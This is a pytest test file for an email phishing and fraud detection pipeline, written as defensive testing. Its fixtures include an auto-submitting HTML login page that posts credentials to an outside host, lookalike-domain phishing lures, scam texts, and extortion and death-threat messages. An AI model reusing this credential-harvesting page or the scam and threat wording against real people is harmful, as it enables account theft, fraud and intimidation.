from __future__ import annotations

import pytest

from app.core import pipeline, threat_intel
from app.core.ai_engine import payment_handles
from app.core.link_analyzer import analyze_url
from app.schemas import ThreatCategory

RELAY = {
    "gmail": ("mail-sor-f41.google.com", "209.85.220.41"),
    "outlook": ("mail-eopbgr1300046.outbound.protection.outlook.com", "40.107.130.46"),
    "ses": ("a27-15.smtp-out.us-west-2.amazonses.com", "54.240.27.15"),
    "vps": ("vps-2291.hostwave.cloud", "185.220.101.45"),
}


def build(
    frm: str,
    subject: str,
    body: str,
    *,
    to: str = "rohan.pandey@acme-corp.in",
    relay: str = "gmail",
    spf: str = "pass",
    dkim: str = "pass",
    dmarc: str = "pass",
    dkim_domain: str = "",
    client_ip: str = "",
    html: bool = False,
    attachment: tuple[str, str, str] | None = None,
) -> bytes:
    address = frm.split("<")[-1].strip(">").strip() if "<" in frm else frm
    domain = address.rsplit("@", 1)[-1]
    dkim_domain = dkim_domain or domain
    host, ip = RELAY[relay]
    lines = [
        f"Delivered-To: {to}",
        f"Return-Path: <{address}>",
        f"Received: from {host} ({host}. [{ip}])",
        "        by mx.google.com with ESMTPS id d9443c01a7336-2f1c3d4e5f6si",
        f"        for <{to}>",
        "        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);",
        "        Thu, 10 Sep 2026 09:30:00 +0530",
        "Authentication-Results: mx.google.com;",
        f"       spf={spf} smtp.mailfrom={address};",
        f"       dkim={dkim} header.i=@{dkim_domain} header.d={dkim_domain} header.s=s2048 header.b=Qm9nd3Vz;",
        f"       dmarc={dmarc} (p=NONE sp=NONE dis=NONE) header.from={domain}",
    ]
    if client_ip:
        lines += [
            f"Received: from [192.168.1.7] ([{client_ip}])",
            f"        by {host} with ESMTPSA id k7sm1234567",
            f"        for <{to}>;",
            "        Thu, 10 Sep 2026 09:28:25 +0530",
        ]
    lines += [
        f"From: {frm}",
        f"To: {to}",
        f"Subject: {subject}",
        "Date: Thu, 10 Sep 2026 09:28:05 +0530",
        f"Message-ID: <9f2a1b3c@{domain}>",
        "MIME-Version: 1.0",
    ]
    if attachment:
        name, ctype, content = attachment
        lines += [
            'Content-Type: multipart/mixed; boundary="XYZ"',
            "",
            "--XYZ",
            "Content-Type: text/plain; charset=utf-8",
            "",
            body,
            "--XYZ",
            f"Content-Type: {ctype}",
            f'Content-Disposition: attachment; filename="{name}"',
            "",
            content,
            "--XYZ--",
        ]
    else:
        lines += [f"Content-Type: text/{'html' if html else 'plain'}; charset=utf-8", "", body]
    return "\r\n".join(lines).encode("utf-8") + b"\r\n"


def run(raw: bytes, cfg):
    return pipeline.analyze_bytes(raw, "test.eml", None, cfg)


def finding_ids(result) -> set[str]:
    return {f.id for f in result.findings}


def test_security_alert_with_first_party_links_is_legitimate(session_cfg):
    body = (
        "We noticed a new sign-in to your Google Account on a Windows device. If not, we'll help you secure your account.\n"
        "Check activity: https://accounts.google.com/AccountChooser?Email=r@gmail.com&continue=https://myaccount.google.com/alert/nt/1\n"
    )
    result = run(build("Google <no-reply@accounts.google.com>", "Security alert", body, relay="gmail"), session_cfg)
    assert result.verdict.category == ThreatCategory.LEGITIMATE
    assert all(u.risk.value in ("info", "low") for u in result.urls.urls)
    assert "open_redirect" not in finding_ids(result)


def test_internal_password_expiry_notice_is_legitimate(session_cfg):
    body = (
        "Your Acme network password will expire in 3 days. Change it at https://password.acme-corp.in before Friday "
        "to avoid being locked out of email and VPN. IT will never ask for your password by email.\n"
    )
    result = run(build('"Acme IT Helpdesk" <it-helpdesk@acme-corp.in>', "Your password expires in 3 days", body), session_cfg)
    assert result.verdict.category == ThreatCategory.LEGITIMATE
    assert all(p.confidence < 0.5 for p in result.nlp.bec_patterns)


def test_genuine_invoice_with_unchanged_bank_details_is_legitimate(session_cfg):
    body = (
        "Please find attached invoice INV-2026-0912 for August consulting services. Amount Rs.2,36,000. Payment due within "
        "30 days as per our contract. Our bank details are unchanged and are printed on the invoice. Kindly share the UTR.\n"
    )
    result = run(build("Bluepeak Accounts <accounts@bluepeak-solutions.com>", "Invoice INV-2026-0912", body, relay="outlook"), session_cfg)
    assert result.verdict.category == ThreatCategory.LEGITIMATE
    assert not any(p.pattern == "payment_diversion" for p in result.nlp.bec_patterns)


def test_authenticated_brand_tld_variant_is_softened(session_cfg):
    body = '<p>Flat 50% off today only! <a href="https://www.zomato.com/offers?utm=email">Order now</a>. Hurry!</p>'
    result = run(build('"Zomato" <noreply@zomato.in>', "Flat 50% OFF today only", body, relay="ses", html=True), session_cfg)
    assert result.verdict.category == ThreatCategory.LEGITIMATE
    assert any("brand-owned" in line for line in result.verdict.rationale)
    softened = [f for f in result.findings if f.id in ("lookalike_domain", "display_name_spoof")]
    assert softened and all(f.severity.value == "low" for f in softened)


def test_parcel_fee_lookalike_link_is_phishing(session_cfg):
    body = (
        "Your DHL parcel could not be delivered because a customs duty of Rs.49 is unpaid. Pay the fee within 24 hours: "
        "https://dhl-parcel-redelivery.info/track/7812334590211/pay\n"
    )
    result = run(build('"DHL Express" <dhl.delivery.notice2026@gmail.com>', "Your parcel is on hold", body, client_ip="197.210.85.12"), session_cfg)
    assert result.verdict.category == ThreatCategory.PHISHING


def test_html_login_attachment_is_phishing(session_cfg):
    page = (
        "<html><body><form method='post' action='https://docs-online-secure.com/collect.php'>"
        "<input name='email'><input name='password' type='password'><button>View</button></form>"
        "<script>document.forms[0].submit()</script></body></html>"
    )
    result = run(
        build(
            '"SharePoint Online" <share@docs-online-secure.com>', "Priya shared 'Invoice_Sept2026' with you",
            "Open the attached file to view the invoice. You will be asked to sign in.",
            relay="vps", spf="none", dkim="none", dmarc="none", attachment=("SecureDoc_Invoice.html", "text/html", page),
        ),
        session_cfg,
    )
    assert result.verdict.category == ThreatCategory.PHISHING
    assert any("login form" in line for line in result.verdict.rationale)


def test_critical_brand_imitating_link_is_phishing(session_cfg):
    body = "Please review the revised SOW on the secure portal and sign by EOD, the link expires today.\nhttps://sharepoint-docs-viewer.com/bluepeak/SOW_v3?auth=required\n"
    result = run(build("Arjun Rao <arjun.rao@bluepeak-solutions.com>", "RE: Revised SOW", body, relay="outlook"), session_cfg)
    assert result.verdict.category == ThreatCategory.PHISHING


def test_investment_lure_is_fraud(session_cfg):
    body = (
        "Our AI trading bot delivers guaranteed returns of 30% every month. Minimum deposit only USD 250. Withdraw profit "
        "any time. Limited slots for September. Join now: https://cryptowealth-advisors.biz/join\n"
    )
    result = run(build("CryptoWealth <invest@cryptowealth-advisors.biz>", "Guaranteed 30% monthly returns", body, relay="vps", dkim="none", dmarc="none"), session_cfg)
    assert result.verdict.category == ThreatCategory.FRAUD
    assert "investment_scam" in finding_ids(result)


def test_tech_support_callback_is_fraud(session_cfg):
    body = (
        "Warning! Your Windows licence has expired and your computer is infected with 5 viruses. Call Microsoft certified "
        "support immediately on +1-800-555-0142 to renew your licence (USD 99). Do not switch off your computer.\n"
    )
    result = run(build('"Microsoft Security Center" <security.center.alerts@outlook.com>', "5 viruses detected", body, relay="outlook"), session_cfg)
    assert result.verdict.category == ThreatCategory.FRAUD
    assert "callback_scam" in finding_ids(result)


def test_payment_handle_needs_pressure_to_be_fraud(session_cfg):
    charity = "Families in Assam have lost their homes. Donate Rs.500 or more to UPI ID reliefund@ybl before midnight tonight and forward this to 10 friends.\n"
    friend = "bro are we still on for saturday? i booked the tickets, send me 500 for yours whenever, my upi is aditya0412@ybl\n"
    scam = run(build('"Flood Relief Fund" <floodrelief.donate2026@gmail.com>', "Donate today", charity, client_ip="103.211.14.90"), session_cfg)
    chat = run(build('"Aditya Sharma" <aditya.sharma.0412@gmail.com>', "saturday plan", friend, client_ip="49.36.220.14"), session_cfg)
    assert scam.verdict.category == ThreatCategory.FRAUD
    assert chat.verdict.category == ThreatCategory.LEGITIMATE
    assert payment_handles("send to reliefund@ybl or bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh via western union") == [
        "UPI reliefund@ybl", "wallet bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh", "western union",
    ]


@pytest.mark.parametrize(
    "subject, body",
    [
        ("", "Haram khor paise de de\n\nGive me my money back otherwise I will kill you\n\nGive me 50000 dollar u duffer\n\nPray for u r life\n"),
        ("last warning", "Pay me 2,00,000 rupees by Friday or I will leak your private photos to everyone you know. I know where your family lives.\n"),
        ("पैसे वापस दो", "पैसे वापस दो नहीं तो जान से मार दूंगा। कल तक 50000 रुपये भेजो वरना अंजाम बुरा होगा।\n"),
    ],
)
def test_money_demanded_under_threat_is_fraud_with_police_actions(session_cfg, subject, body):
    result = run(build("mousamjha2006@gmail.com", subject, body, to="sarthaksrivastava525@gmail.com"), session_cfg)
    assert result.verdict.category == ThreatCategory.FRAUD
    assert {"extortion_demand", "violent_threat"} & finding_ids(result)
    assert any("1930" in action for action in result.verdict.recommended_actions)


def test_violent_threat_without_money_is_suspicious_at_high_risk(session_cfg):
    body = "I will find you and kill you. Watch your back when you leave office. You will pay for what you did to my brother.\n"
    result = run(build("ghost.rider.9911@yahoo.com", "", body), session_cfg)
    assert result.verdict.category == ThreatCategory.SUSPICIOUS
    assert result.verdict.risk_score >= 50
    assert "violent_threat" in finding_ids(result)
    assert any("1930" in action for action in result.verdict.recommended_actions)


def test_shared_provider_relay_is_not_a_campaign_indicator(session_cfg):
    webmail = run(build("someone.4412@gmail.com", "hello", "Are we meeting tomorrow?\n"), session_cfg)
    own_server = run(build("ops@hostwave-tools.cloud", "hello", "Are we meeting tomorrow?\n", relay="vps"), session_cfg)
    assert webmail.headers.origin_shared_provider == "Google"
    assert webmail.headers.origin_confidence <= 0.5
    assert not any(i.startswith("ip:") for i in webmail.intel.indicators)
    assert own_server.headers.origin_shared_provider == ""
    assert "ip:185.220.101.45" in own_server.intel.indicators
    indicators = threat_intel.extract_indicators(
        webmail.email, webmail.headers, webmail.urls, webmail.attachments, webmail.domains, webmail.infrastructure
    )
    assert "sender:someone.4412@gmail.com" in indicators


def test_same_site_redirect_is_not_an_open_redirect(cfg):
    internal = analyze_url("https://accounts.google.com/AccountChooser?continue=https://myaccount.google.com/x", "", cfg)
    external = analyze_url("https://google.com/url?q=https://evil.top/login", "", cfg)
    assert "redirect_parameter" not in internal.obfuscation
    assert "redirect_parameter" in external.obfuscation


def test_raw_evidence_survives_losing_the_file(cfg, store, sample):
    raw = sample("phishing")
    result = pipeline.analyze_bytes(raw, "phishing.eml", store, cfg)
    path = cfg.evidence_dir / f"{result.id}.eml"
    assert path.read_bytes() == raw
    path.unlink()
    assert store.get_raw(result.id) == raw
    assert path.exists()
